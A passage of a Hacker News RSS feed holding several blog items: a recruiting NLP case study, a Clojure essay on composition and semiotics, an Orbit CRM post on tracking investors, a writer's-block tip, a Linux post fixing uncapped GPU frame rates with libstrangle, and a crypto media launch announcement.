<p>We use descriptions because our search understands concepts and ideas. The algorithm knows that a “<span>data scientist</span>” is a person that is likely to know languages like “<span>Python</span>”, “<span>SQL</span>”, or others and takes on roles such as an “<span>analyst</span>” or “<span>engineer</span>”. By teaching the algorithm to seek out candidates who have experience with “<span>toys</span>”, “<span>education</span>” and “<span>children’s products</span>”, we can find people with relevant experience in related areas like “gaming” or “youth development”.

</p><p>Another way to think about this interface is that the recruiter simply has to <i>write</i> an answer to the question, “What sort of candidate are you looking for?” You need not worry about the specific structure of your response, or fitting keywords into specific parts of a search form. The above example could easily be “A former toy designer interested in analytics” or “A multilingual French-speaker who can design products and analyze data.”

</p><p>Our goal is to give the algorithm an idea of what type of candidate to look for. It will identify and make connections between concepts to find the strongest candidates. It is not limited by specific keywords. This means that a recruiter or hiring manager saves time by automating searches, while generating a broader diversity of qualified candidates.

</p><p><b>2. Search the whole resume, not just skills lists or keywords</b>

</p><p>Our semantic approach makes it easier for us to scan an entire resume to understand the person as a whole. For instance, a candidate might outline an interest in “children’s products” in one part of their resume, but not include this in their core skillsets elsewhere. This semantic approach tracks the <i>entire</i> resume and scores the <i>themes</i> that come up rather than just individual skills or keyword flags.

</p><p><a name="results"></a>The Result: 26 Days for Time-to-Hire and a Great Candidate Experience

</p><p>Maison Battat is a family-owned toy company that encourages kids to be bold, curious, and playful. For over 45 years, they have offered a range of engaging toys for babies, toddlers, and young children including Driven™ tough trucks to dolls of Our Generation™.

</p><p>Battat wanted to hire a unique candidate with experience in marketing, e-commerce, data science and analytics. They sought out someone who was a self-starter, fast learner, proficient in another language, has lived abroad, and shares their passion for improving the lives of children through play and education.

</p><p>Our text mining approach above was used to analyze over 1,000 data science candidate profiles. The top result was Sogra, a bilingual data analyst with international experience. Importantly, she was the ultimate self-starter having created an award-winning smart toy while she was working at a toy startup.

</p><p>Sogra was the first and only candidate interviewed – she was perfect for the role. Not only was the role filled in 26 days, but both employer and employee were thrilled with the significantly easier process and speedy approach.

    </p></div>

    </div>

    
  </div><div>
   <div>

     

     <div>

<p>“Phase reached out to me about a data analyst role at a toy company. Two weeks after I was introduced to the hiring manager, I accepted their job offer. I’m excited to have a data role that leverages my background as a toy designer. I feel amazing!”

</p><center></center>

<center><img src="https://joinphase.com/person_sogra.jpg"></center>

     </div>

     <div>

<p>“Phase has been a fantastic talent partner for our company. We hired the first candidate they sent us -- she was experienced in our industry and had a great analytics background. We went from first candidate introduction to first day on the job in 26 days.”

</p><center><p>Guillaume<br>Head of Amazon Business Unit,<br>Maison Battat<br>&nbsp;</p></center>

<center><img src="https://joinphase.com/person_guillaume.jpg"></center>

     </div>

     

    </div>
  </div></div>]]>
            </description>
            <link>https://joinphase.com/talent-acquisition-nlp</link>
            <guid isPermaLink="false">hacker-news-small-sites-25780588</guid>
            <pubDate>Thu, 14 Jan 2021 18:58:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Composition is Interpretation]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25780502">thread link</a>) | @jashkenas
<br/>
January 14, 2021 | https://ideolalia.com/essays/composition-is-interpretation.html | <a href="https://web.archive.org/web/*/https://ideolalia.com/essays/composition-is-interpretation.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

	

	<div>
		<article>
			<p>Every useful process goes through at least one iteration of pulling data into scope, transforming the data, and pushing that data into another scope.<sup id="fnref:process" role="doc-noteref"><a href="#fn:process">1</a></sup>  Consider <code>grep</code>: it reads a line from <code>stdin</code>, examines the line to see if it should be forwarded to <code>stdout</code>, and repeats until <code>stdin</code> is exhausted.  Conversely, <code>cat</code> isn’t independently useful; it only exists to forward the filesystem into another process, which may simply be our terminal.</p>

<p>In almost every case, the transformation of a useful process is <strong>reductive</strong>; it emits less than it consumes.  When a process has a larger volume of output than input, it’s generally providing a different (and ostensibly more useful) representation of its input.  Examples of this include <code>gunzip</code> and a program which, given a seed value, emits a neverending stream of pseudorandom numbers; both are only useful when placed upstream of another process.</p>

<p>For sufficiently small inputs, this might be useful on its own.  We can uncompress a small gzipped file and read it in the terminal, or swap the delimiters in a small CSV file for HTML tags and look at it in the browser.  But few datasets are intrinsically small; if we’re able to take in our data at a glance today, we shouldn’t expect to be so lucky tomorrow.</p>

<p>This reduction of our input data isn’t arbitrary; we are distilling it down to its meaning, in context.  If we’re concerned on the errors in our logs, we lose nothing by filtering out everything else.  If we’re concerned with the number of errors day-over-day, we lose nothing by reducing each log file down to a single number.  This is the essence of <strong>interpretation</strong>, as defined within the field of <a href="https://en.wikipedia.org/wiki/Semiotics">semiotics</a>: the transformation of one <a href="https://en.wikipedia.org/wiki/Sign_(semiotics)">sign</a> to a related sign, which often exists within a different <a href="https://en.wikipedia.org/wiki/Sign_system">system</a> of signs.</p>

<p>Our colloquial understanding of interpretation captures most of this; we are assigning meaning to something.  This process is subjective, and largely arbitrary; we are free to assign whatever meaning we like.  There are often multiple useful interpretations, and we can consider them together to better understand what we’re interpreting.</p>

<p>Semiotics also tells us that each meaning is itself just another sign, which can be interpreted in turn.  This idea, called <em>unlimited semiosis</em> in modern semiotics, was considered very unintuitive when it was first suggested in the 19th century by Charles Peirce.  In the context of software, however, it’s self-evident: each function interprets its inputs, yielding a result that can be interpreted by other functions, and so on.  There is no obvious or necessary end to this process; at some point we simply share our results with the outside world, allowing someone else to continue the chain of interpretation.</p>

<p>Meaning is created by combining software and data.  Data, by itself, is inert.  Software, by itself, is only a method for interpretation.  Software interprets data, but the converse is also true.  Different inputs will take different paths, and yield different meanings; our software is interpreted by the data it’s given.</p>

<p>This inverted perspective is useful when we look at how pieces of software are combined to create a whole.  When one function calls another, it is interpreting the purpose of the function it calls.  It is assigning meaning, in context.</p>

<p>Consider this expression, which removes all the bad values from a sequence of values:<sup id="fnref:clojure" role="doc-noteref"><a href="#fn:clojure">2</a></sup></p>



<p>The <code>remove</code> function, on its own, is highly abstract; it treats all possible predicates and all possible sequences as interchangeable.  By calling it with a specific predicate, we have made it more concrete.  As we further compose upstream, and the meaning of <code>s</code> becomes more defined, so too does the meaning of our expression.  If we think <code>(remove bad? ...)</code> lends itself to multiple interpretations, by multiple sequences, we might even give it a name:</p>

<div><div><pre><code><span>(</span><span>def</span><span> </span><span>good</span><span> </span><span>(</span><span>partial</span><span> </span><span>remove</span><span> </span><span>bad?</span><span>))</span><span>
</span></code></pre></div></div>

<p>As we compose functions, our program’s interpretation of its input becomes increasingly abstract; by filtering out <code>bad?</code> values, we treat any interleaving of those values as if they were the same.</p>

<p>Not every function, however, makes an equal contribution to this growing abstraction; <code>remove</code> is just a different idiom for <code>filter</code>:</p>

<div><div><pre><code><span>(</span><span>defn</span><span> </span><span>remove</span><span> </span><span>[</span><span>predicate</span><span> </span><span>s</span><span>]</span><span>
  </span><span>(</span><span>filter</span><span>
    </span><span>(</span><span>complement</span><span> </span><span>predicate</span><span>)</span><span>
    </span><span>s</span><span>))</span><span>
</span></code></pre></div></div>

<p>Likewise, <code>complement</code> just negates a function’s return value, turning <code>false</code> to <code>true</code> and vice-versa.  These functions do not assign meaning, they attempt to preserve it in a different form.  Rather than interpreting, they are <strong>translating</strong>.</p>

<p>Of course, any semiotician will tell you that <a href="https://www.orionbooks.co.uk/titles/umberto-eco/mouse-or-rat/9781780226279/">translation isn’t easy</a>, and some meaning is invariably lost along the way.  But these strata in our codebases, which attempt to translate rather than interpret, are qualitatively different; they are what we call “glue code.”</p>

<p>This, however, only defers the act of interpretation to a higher strata.  Our code exists to be interpreted, either by data or by other code composed atop it.  We leave room for interpretation using two fundamental mechanisms: function references and conditional execution.</p>

<p>Both of these mechanisms allow a function’s inputs to influence its execution.  Consider this implementation of <code>filter</code>:</p>

<div><div><pre><code><span>(</span><span>defn</span><span> </span><span>filter</span><span> </span><span>[</span><span>predicate</span><span> </span><span>s</span><span>]</span><span>
  </span><span>(</span><span>cond</span><span>
    </span><span>(</span><span>empty?</span><span> </span><span>s</span><span>)</span><span> 
    </span><span>[]</span><span>
    
    </span><span>(</span><span>predicate</span><span> </span><span>(</span><span>first</span><span> </span><span>s</span><span>))</span><span> 
    </span><span>(</span><span>cons</span><span> 
      </span><span>(</span><span>first</span><span> </span><span>s</span><span>)</span><span> 
      </span><span>(</span><span>recur</span><span> </span><span>predicate</span><span> </span><span>(</span><span>rest</span><span> </span><span>s</span><span>))))</span><span>
      
    </span><span>:else</span><span>
    </span><span>(</span><span>recur</span><span> </span><span>predicate</span><span> </span><span>(</span><span>rest</span><span> </span><span>s</span><span>)))</span><span>
</span></code></pre></div></div>

<p>First we check if the sequence is empty; if so, we return an empty sequence.  If it isn’t empty, we check if the first element satisfies the <code>predicate</code>; if so, we prepend it onto the result of filtering the rest of the sequence.  Otherwise, we omit the element from our result.</p>

<p>The first clause is simple conditional execution; given an empty sequence, <code>filter</code> will short-circuit.  The second clause is both a function reference and conditional execution; <code>filter</code> will call whatever <code>predicate</code> we’ve provided, and use the returned result to choose one of two branches.</p>

<p>But these are implementation details; the person calling <code>filter</code> should be able to focus on its semantics, not the precise way it uses its inputs.  As implementors, first we decide what sorts of interpretations our function will allow, and then we determine what minimal set of inputs will allow those interpretations.</p>

<p>In the above implementation, for instance, we don’t wrap each recursion in Clojure’s <a href="http://clojure-doc.org/articles/language/laziness.html#benefits-of-lazy-sequences"><code>lazy-seq</code></a> macro, meaning the entire filtered sequence is eagerly computed.  If we had made it lazy, that would allow for the code atop <code>filter</code> to have more control over where and when each element of the inputs sequence is processed.  Alternately, if we wanted to remain eager, we could have exposed a way for the code invoking <code>filter</code> to control what sort of collection it constructed, rather than always returning a <code>cons</code>-based list.</p>

<p>A broader range of possible interpretations isn’t necessarily better; simplicity has its own benefits.  If we’re happy discarding our code tomorrow, we can focus entirely on our needs today.  If we want our code to survive a bit longer, however, or even be a general-purpose library, we need to be more expansive.</p>

<p>In general-purpose code, we should rely on function references wherever possible.  In addition to the first-class functions that are common in Clojure, these encompass any object instance with one or more associated methods.<sup id="fnref:closures" role="doc-noteref"><a href="#fn:closures">3</a></sup>. Function references provide an <strong>open</strong> mechanism for interpretation; to extend the set of possible interpretations, you just have to write your own function.</p>

<p>Conditional execution, conversely, is a <strong>closed</strong> mechanism; to extend the set of possible interpretations we need to edit a preexisting function.  In general-purpose code, this is almost always driven by some sort of open classifier function, which reduces all possible values down to a finite set of categories.  In Java, for instance, <code>equals</code>, <code>compareTo</code>, and <code>hashCode</code> reduce their inputs down to 2, 3, and 2<sup>32</sup> categories, respectively.</p>

<p>In some cases, general-purpose code may also have conditional execution based on internal datatypes.  The semantics of a red-black tree, for instance, are entirely driven by an externally provided ordering function, but its internal bookkeeping will have <a href="http://matt.might.net/papers/germane2014deletion.pdf">lots</a> of <code>if</code>s or <code>match</code>es dealing with red and black nodes.</p>

<p>If your code has conditional execution based on public datatypes, however, it’s not meant to be general purpose; it’s what we call “business logic.”  This is the upper strata of our application, interpreted by data rather than other code.  Here, the closed nature of conditional execution is useful; we can understand the meaning of a given input by looking at a single point in our codebase.  What endpoints does our API offer?  Just look at the file where all of the routes are defined.</p>

<p>Almost anyone who writes software for a living can tell the difference between glue code, library code, and business logic.  The first time we heard each term, it was fairly clear from context and the names themselves what was being described.  If someone doesn’t understand, we assume they’ll figure it out soon, just like we did.</p>

<p>We may have a solid <a href="https://en.wikipedia.org/wiki/Tacit_knowledge">tacit understanding</a> of these concepts, but would struggle to explain them, and how they relate to each other.  Semiotics seems to provide a framework that can formalize and correlate this knowledge.  Put another way, I believe every skilled software designer has an innate, mostly undeveloped talent for applied semiotics, and I’m curious what would happen if they tried to develop it.</p>

<p>Unfortunately, I don’t think simply reading <a href="https://iupress.org/9780253202178/a-theory-of-semiotics/">a seminal text on semiotics</a> will suffice; the interpretation done by software is vastly more reductive than that done by humans.  When we use the idea of library to denote a book, or vice-versa, the amount of detail in our mental conception changes very little, if at all.  In many contexts, they will have very similar connotations.  But in a computer, a library-sized dataset is not an abstract symbol of knowledge; it’s a library’s worth of data, which is not at all the same as …</p></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ideolalia.com/essays/composition-is-interpretation.html">https://ideolalia.com/essays/composition-is-interpretation.html</a></em></p>]]>
            </description>
            <link>https://ideolalia.com/essays/composition-is-interpretation.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25780502</guid>
            <pubDate>Thu, 14 Jan 2021 18:53:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My data-centric approach to tracking investor relationships]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25780497">thread link</a>) | @mooreds
<br/>
January 14, 2021 | https://orbit.love/blog/my-data-centric-approach-to-tracking-investor-relationships/ | <a href="https://web.archive.org/web/*/https://orbit.love/blog/my-data-centric-approach-to-tracking-investor-relationships/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><strong>“Let me know how I can be helpful.”</strong></p><p>This phrase has become something of a <a href="https://vcstarterkit.substack.com/p/in-defense-of-let-me-know-how-i-can">caricature of itself</a> among VCs, right up there with Patagonia vests and coffee meetings at The Creamery.</p><p>The good news is that, despite the jokes, most investors I've spoken with seem to really mean it (and yes, vests really <em>are </em>a<em> </em>practical choice in SF).</p><p>So even though the phrase has become a bit of a meme, I <em>actually am</em> interested in understanding who has been helpful over time.</p><p>Personal chemistry matters a lot in any relationship, but in choosing which investors to work with, I like to couple that kind of qualitative information with important quantitive data as well. In other words, I want to know whom I get along with as well as who's helping out in the ways they've said they would.</p><p><strong>In this article, I’ll share with you my specific workflows for keeping track of key moments in relationship building</strong> so that you’ll always have confidence about where things stand with current and potential investors.</p><h2>My process</h2><p>The approach is simple. I record key moments in each relationship, like when an investor makes a customer intro, refers a potential candidate, or helps out in some other way.</p><p>By keeping track of those moments over time, I can take an objective look at how we're working together in light of these specific actions—who's delivering on offers to make intros? who's providing meaningful input?</p><p>I've found that this kind of data couples nicely with the more implicit qualitative aspects of the relationship.</p><p>So what tool is right for managing all this?</p><p>On the surface, this may seem like a job for a CRM, but I've found that <strong>traditional CRMs don’t work for this.</strong></p><p>I’ve tried loads of them, and have always found the experience lacking. They’re usually premised on stages of a pipeline and expected deal value, and are more interested in <em>leads</em> and <em>accounts</em> than individuals.</p><p>Orbit, on the other hand, is based on the <a href="https://github.com/orbit-love/orbit-model">Orbit Model</a> and on <strong><em>activities</em></strong> — who’s doing what, and when did they do it?</p><p><strong>It turns out this is the perfect data model for understanding how a relationship grows over time. </strong>That’s why I’ve been using Orbit as my personal CRM.</p><p>The result? Rich context on the people in my orbit, as well as a way to quickly see how different folks are engaging (or not), and how:</p><p><img src="https://cdn.sanity.io/images/cad8jutx/production/f282ac371e18c25a3c5dc6c81ffb3da02441e81d-2604x940.png" alt="Screenshot of the Orbit Members Table" title="Orbit Members Table Example"></p><h2>Key ideas</h2><p>Before getting into the workflows, let’s cover two important concepts in Orbit: Members and Activities.</p><p>A <strong>Member</strong> is a person added to your Orbit workspace: manually, via an integration, or via API. Each member has a profile page where you can see lots of data about that member as well as a timeline of activities they’ve done, content they’ve created, and more.</p><p><strong>Activities</strong> are things a member does, like mentioning you on Twitter, attending an event, meeting with you, or, as in this case, doing things like making intros, or anything else you want to keep track of.</p><p>Activities will appear chronologically on a member’s profile, as well as in a global stream for your entire workspace.</p><p>The combo of members + activities tells you who’s doing what, when they did it, and where.</p><blockquote>For more on how we use Orbit to build Orbit, <a href="https://orbit.love/blog/how-we-use-orbit-to-build-orbit/">check out this article</a>.</blockquote><h2>Tracking social mentions as activities</h2><p>Activities are added to your workspace manually or via an integration.</p><p>Orbit offers several <a href="https://orbit.love/integrations/">integrations</a> that add members and activities to your workspace automatically. Some are better for companies or large communities, e.g. our GitHub and Discourse integrations.</p><p><strong>For individuals, the Twitter integration is really handy</strong>. It automatically aggregates mentions and follows of your account, as well as any keywords you’d like to track.</p><p>This can be helpful for general relationship building, but also for understanding which VCs are engaging on social by following you, mentioning you in relevant conversations, and sharing your content.</p><p>Here’s my personal workspace timeline showing Twitter activity alongside the custom activities we'll discuss below:</p><p><img src="https://cdn.sanity.io/images/cad8jutx/production/0266d1a17d14ba1742960a30bfebbf5cd81e14e1-1040x1050.png" alt="Screenshot of the Orbit Activity Feed" title="Orbit Activity Feed"></p><p>Any time an investor follows or mentions me, I add a tag to their profile to designate them as an investor:</p><p><img src="https://cdn.sanity.io/images/cad8jutx/production/4749c8f7f9eaa1747d92266247112829ccddcd78-518x282.gif" alt="Animation of adding a tag to a member profile in Orbit" title="Orbit Tag Demo"></p><p>Tags are great because you can sort and filter views and reports based on tags. For example, you can filter the Members table by the investor tag to see only investors, or filter the Activity feed by the same tag to see only activities from folks with that tag.</p><h2>Tracking specific investor activities</h2><p>In addition to automated activity tracking from integrations and the API, you can also manually add activities.</p><p>Manual work isn’t ideal, and we try hard to reduce data entry as much as possible, but for some things, like high-value non-recurring activities, it’s unavoidable.</p><p><strong>I keep track of a few different activities across my investor relationships:</strong></p><ul><li>Customer intros made</li><li>Candidate intros made</li><li>Meetings (these aren’t necessarily helpful, but I still like to have context)</li></ul><p>Here’s a timeline of an investor who’s made two helpful intros:</p><p><img src="https://cdn.sanity.io/images/cad8jutx/production/b8246312af0ebccbe765e8e93b02d19f21bd60c7-1999x826.png" alt="Screenshot showing an Orbit member prpofile" title="Profile of an investor"></p><p>Adding activities is pretty fast. The title is the only thing required, though I usually include relevant context in the description field, and define an “activity type.” In the screenshot above, the activity types are <em>meeting</em> and <em>intro</em>.</p><p>In addition to tags, activity type is another way to filter and sort, as we’ll see later.</p><p>You can track literally anything you want, so feel free to get creative beyond my examples here.</p><h2>Adding notes</h2><p>Sometimes you want to add context to a profile that’s not necessarily associated with an activity. In those cases, you’d just add the content to a note:</p><p><img src="https://cdn.sanity.io/images/cad8jutx/production/cad465e65d62216810cfdc56604384d20ff0cb14-1426x452.png" alt="Screenshot showing a note on the Orbit timeline. The note says: &quot;REDACTED has always been super responsive to investor updates, which is much appreciated, as well as responsive to texts and c…&quot;" title="Note detail view"></p><p>Even better, Orbit indexes the text of your notes, so you can find them later via Search.</p><h2>The impact of tracking relationship growth</h2><p>Now that you’ve spent the time to track all your key relationship moments, you can sort your investors by Love, which illustrates their engagement over time, and Reach, which is a function of their Twitter followers:</p><p><img src="https://cdn.sanity.io/images/cad8jutx/production/f282ac371e18c25a3c5dc6c81ffb3da02441e81d-2604x940.png" alt="Screenshot of the Orbit Members Table" title="Orbit Members Table Example"></p><p>Remember Activity Types from earlier? You can sort this table (and other views) by those types. For example, <strong>it’s trivial for me to see a list of folks who’ve made intros</strong>:</p><p><img src="https://cdn.sanity.io/images/cad8jutx/production/a508809009b04327cff53fc61a00fd7496471e3d-1999x436.png" alt="Screenshot of the Filter UI" title="Filtering activity types"></p><p>You can also use Search to build complex queries, like investors who have done 10+ activities who live in New York, or folks who have made customer intros who also follow me on Twitter.</p><p>The use case for search depends greatly on your situation, but suffice it to say that, as you add data to Orbit over time, the data—and your ability to find it—becomes increasingly powerful.</p><h2>Bonus section: charts!</h2><p>Reporting is probably less important for your personal use case than for a company’s, but that doesn’t mean they’re not fun to look at! If you've been using activity types consistently, Orbit can show you your trend of key activities over time, whether that's intros, meetings, or whatever's important.</p><p>Here’s an example of Activities by Type from the main Orbit workspace:</p><p><img src="https://cdn.sanity.io/images/cad8jutx/production/91833ac69a61f25e41bf575c60cabbed6aa46348-1999x1070.png" alt="Screenshot of a chart showing activities over time" title="Activities chart"></p><p>We also track Twitter follows and mentions:</p><p><img src="https://cdn.sanity.io/images/cad8jutx/production/6d7904ad2eb11c3ecc6f932307d46a4022d315a1-1999x976.png" alt="Screenshot showing Chart of Twitter activity" title="Chart of Twitter activity"></p><h2>Who actually has been helpful?</h2><p>So what are the outcomes of all this? For one, you’ll have loads of context about current and potential investors to help you better build and navigate those relationships.</p><p><strong>You’ll also have a clear record of how different folks have tangibly worked to impact your business.</strong> By the time you’re ready to raise your next round, you’ll be able to rely on more than just gut feeling or promises made.</p><p>Investor relationships last many years, so I think it’s worth spending a little time early on to track these key moments in service of helping you make better decisions about your long-term partners.</p><p><strong>Want to try this? </strong>Shoot me a DM on Twitter <a href="https://twitter.com/patrickjwoods">@patrickjwoods</a> with your email address and a note about what you’re working on, and I’ll send over setup info. Good luck!</p></div></div>]]>
            </description>
            <link>https://orbit.love/blog/my-data-centric-approach-to-tracking-investor-relationships/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25780497</guid>
            <pubDate>Thu, 14 Jan 2021 18:52:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[One simple tip to remove anxiety and writers block]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25780490">thread link</a>) | @simplecto
<br/>
January 14, 2021 | https://www.simplecto.com/one-simple-tip-remove-anxiety-writers-block/ | <a href="https://web.archive.org/web/*/https://www.simplecto.com/one-simple-tip-remove-anxiety-writers-block/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
	<article>
		<div>

			<section>
				<h3 id="executive-summary">Executive Summary</h3><p>Sometimes I struggle to come up new topics for content. One strategy to resolve this is to simply lurk on social media and then join a conversation. It jump-starts my thoughts and leads me to original angles on things I'm interested in. Today I'll talk about my own insights and strategies to create or repurpose content.</p><h3 id="i-want-to-write-more-but-i-don-t-know-what-to-write-about-">I want to write more, but I don't know what to write about.</h3><p>Been there, still there (sometimes). </p><p>Writer's block is real. When the creative well runs dry I usually start lurking on forums, on Twitter threads, or even on LinkedIn. In short time I usually find something that sparks an insight or opinion. It also gives me a good barometer as to what the current threads of thought are out there.</p><h3 id="researching-my-own-past">Researching my own past</h3><p>Go back to the beginning of this blog and you will see that I have "upcycled" replies from Quota, Reddit, and Hacker News into longer-form posts. The conversations or questions out in the wild helped me understand what I actually think and what I actually know.</p><p><em>Make a contribution to the conversation valuable, but don't give everything</em></p><p>It usually starts like this:</p><ol><li>I find something that I want to reply to</li><li>It starts a witty one or two-liner, but then I get going. Before long there are three paragraphs and more to come.</li><li><em>Hit the brakes!</em> – I cut-paste that comment into my blog here and finish the thought up to 500 words.</li><li>Write a quick synopsis (tldr;) on the thought</li><li>Post the synopsis into the comment section. Mention that I've got a more complete thought and the link to it.</li></ol><h3 id="is-this-spammy-or-shilling">Is this spammy or shilling?</h3><p>Some might criticize this as spammy behavior, but I disagree. The question or original thread was inspiration for a follow-on thought. I don't think the comment threads are really meant for replies longer than the original piece. In fact it dove-tails nicely into a future conversation.</p>
			</section>

			


			


			


		</div>
	</article>
</div></div>]]>
            </description>
            <link>https://www.simplecto.com/one-simple-tip-remove-anxiety-writers-block/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25780490</guid>
            <pubDate>Thu, 14 Jan 2021 18:52:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Some programs in Linux fail to limit FPS]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25780283">thread link</a>) | @vegadw
<br/>
January 14, 2021 | https://opguides.info/posts/slowdown/ | <a href="https://web.archive.org/web/*/https://opguides.info/posts/slowdown/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
  
  
  <h5>January 14, 2021</h5>



  

  


  <p>I use <a href="https://vcvrack.com/">VCV Rack</a> a lot. I normally use it on Windows as running VSTs in Linux is still a bit of a PITA and If I’m going to make music I want to have access to all of my tools. However, I still want to be able to use VCV on Linux for processing guitar when taking breaks from working on other things without having to reboot over to Windows.</p>
<p>Unfortunately, for a good while now VCV has had an annoying bug. I’m not sure when the bug first appeared, but at some point it started eating my GPU. Like, absolutely wrecking it.</p>
<p><img src="https://opguides.info/VCVfail.png" alt=""></p>
<p>
    <a href="https://github.com/clbr/radeontop">Radeontop (GitHub)</a>
</p>
<p>It was still technically usable, in fact it ran butter smooth…</p>
<p><img src="https://opguides.info/fps.png" alt=""></p>
<p>Oh wait, I wonder if killing <a href="https://github.com/yshui/picom">picom</a>, the X11 compositor I use will help</p>
<p><img src="https://opguides.info/nocomp.png" alt=""></p>
<p>Nopeeee.</p>
<p>Alright, obviously this is far from ideal. I actually only knew to check the FPS because of an interesting quirk, I think when the FPS got this high my GPU was getting jobs at that rate, so 930ish times per second, but still finishing them quickly enough to cause the GPU load to constantly change going 100% â†’ 0% â†’ 100% â†’ 0% … in a loop, really fast. It caused the physical GPU, an AMD Vega56, to whine in my tower. I don’t <em>think</em> it was <a href="https://en.wikipedia.org/wiki/Electromagnetically_induced_acoustic_noise">coil whine</a>, but it was also very loud and sounded similar.</p>
<p>First I tried just changing the FPS target value in VCV and then I tried playing with settings in the <code>settings-v1.json</code> file, but nothing worked.</p>
<p>My next attempt to fix it was to try rebooting and loading my system with the Zen Linux kernel as I knew it used a different scheduler and did some extra stuff for real time computation (nice to have anyway when doing audio stuff like VCV).</p>
<p>Unfortunately, that was a bust. Still rocking the 930 FPS.</p>
<p>From here I had to ask for more help. Thankfully, a friend in my modular music chat on telegram was able to point me to a few ideas. I ran <code>glxinfo</code>, made sure everything looked sane, and it was. Next I tried using <code>LIBGL_THROTTLE_REFRESH=1</code> and <code>WGL_SWAP_INTERVAL=1</code> with no luck either.</p>
<p>Failing other ideas I Googled “linux limit frame rate environment variables” and one of the top results was <a href="https://gitlab.com/torkel104/libstrangle">libstrangle (GitLab)</a> which limits frame rate by using <code>LD_PRELOAD</code> to dynamically link it’s own library that does the FPS limiting. This reeks of hacky bullshit. But I’m <em>always</em> down for some hacky bullshit. For S&amp;Gs I check, and `lo and behold it’s in the AUR.</p>
<p><img src="https://opguides.info/strangle.png" alt="strangle"></p>
<p>I still have no idea what’s going on. The easy guess is “You have a Vega56, it’s a weird GPU with HBM2” and, yeah, that makes sense, but then there’s <a href="https://github.com/VCVRack/Rack/issues/1829">This Issue</a> in VCV Rack’s GitHub repo where someone else is having the same problem on an Nvidia card on Ubuntu. I’m using an AMD Card on Arch! Other than the commonality of Linux, these systems couldn’t be much more different.</p>
<p>That issue shows the original poster had traced it down to <a href="https://github.com/VCVRack/Rack/blob/e334902e8addf96ad726192c665d806f0952def0/src/window.cpp#L415">one line</a>, but I’m hesitant to accept that explanation when VCV works fine for me on Windows and the issue has no other comments from other people with the same issue.</p>
<p>prior to this fix, VCV could outright lockup my entire system as my GPU screamed bloody murder, but it got me thinking- while VCV is by far the most violent I’ve seen this issue get, I think I’ve seen it elsewhere, and yep:</p>
<p><img src="https://opguides.info/nuklearfps.png" alt="nuklearfps"></p>
<p>This is the example project for <a href="https://github.com/Immediate-Mode-UI/Nuklear">Nuklear</a>, “A single-header ANSI C immediate mode cross-platform GUI library”, exhibiting the same issue. I’m curious how many projects based on Nuklear this affects.</p>
<p>LibStrangle again works to fix this, but without it my graphic card still makes an annoying whine, a whine that I don’t get under even very high load when gaming.</p>
<p>I won’t include anymore FPS screenshots, but I get the exact same behavior in <a href="https://users.notam02.no/~kjetism/radium/">Radium</a>, a neat tracker-like Digital Audio Workstation.</p>
<p>I suspect there are many, many more. I’m not going to go checking every program on my system, but I found this behavior weird enough to be worth documenting.</p>

</article></div>]]>
            </description>
            <link>https://opguides.info/posts/slowdown/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25780283</guid>
            <pubDate>Thu, 14 Jan 2021 18:38:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Brand behind 'Pomp Podcast' launched 'Bloomberg meets Morning Brew for crypto']]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25780097">thread link</a>) | @jjyano
<br/>
January 14, 2021 | https://blockworks.co/launch-announcement/ | <a href="https://web.archive.org/web/*/https://blockworks.co/launch-announcement/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        
<p>Bitcoin and crypto are no longer obscure internet phenomena. Over the past decade, they have become a critical alternative asset class that impacts nearly every institution in the world.</p>



<p>At Blockworks, we’ve been helping investors understand this emerging asset class for nearly three years.&nbsp;</p>



<p>Today, Blockworks is excited to announce the launch of our editorial site.</p>



<p>Leveraging our new site and <a href="https://blockworks.co/newsletter/">daily newsletter</a>, our editorial team will focus on the asset managers, companies, and individuals that shape the crypto industry.&nbsp;</p>



<p>The goal of our editorial team is simple: to provide investors and finance professionals with the news, analysis, and insights they need to make informed decisions about the digital asset space.</p>



<h3><strong>What you can expect:</strong></h3>



<p>As an independently-owned company that has never raised venture money, coverage from Blockworks will have no agenda.&nbsp;</p>



<p>We pledge to report on the industry in a way that is unbiased, fact-based and accessible.&nbsp;</p>



<p>We will dutifully cover markets, investment trends, and regulatory developments that connect the emerging crypto ecosystem with the broader world of macro finance.</p>



<h3><strong>Why now?&nbsp;&nbsp;</strong></h3>



<p>Bitcoin has emerged as a non-sovereign, global, decentralized, digital store of value.&nbsp;</p>



<p>The industry is experiencing record institutional inflows, from macro hedge funds, to university endowments, to RIAs.</p>



<p>This transformation is happening at one of the most uncertain moments in the history of our global financial system. In a three month time span in 2020, central banks printed $25 trillion.</p>



<p>Corporate and sovereign debt levels are at all time highs, interest rates are at all time lows, and inequality is increasing faster than ever before.</p>



<p>If we’ve learned one thing in 2020, it’s that the “old way” of doing things isn’t working. </p>



<p>We’re entering into a new world of finance, and Blockworks is here to help you navigate it.&nbsp;</p>



<h3><strong>About Blockworks:</strong></h3>



<p>Blockworks is a financial media brand that delivers breaking news and premium insights about digital assets to millions of investors.&nbsp;</p>



<p>Our editorial content, newsletters, podcasts and events provide investors with the critical analysis and information they need to make smarter decisions about digital assets.</p>



